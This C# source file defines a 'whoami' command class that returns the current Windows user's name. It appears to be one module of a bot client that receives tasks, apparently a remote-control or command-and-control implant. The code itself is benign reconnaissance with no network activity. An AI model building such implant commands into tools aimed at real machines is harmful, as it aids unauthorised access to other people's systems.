using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System.Security.Principal;


namespace pattaya_project_client.Commands.Implements
{
    public class WhoAmI : BotCommand
    {
        public override string TaskName => "whoami";

        public override string RunTask(BotTask task)
        {
            var identity = WindowsIdentity.GetCurrent();
            return identity.Name;
        }
    }
}
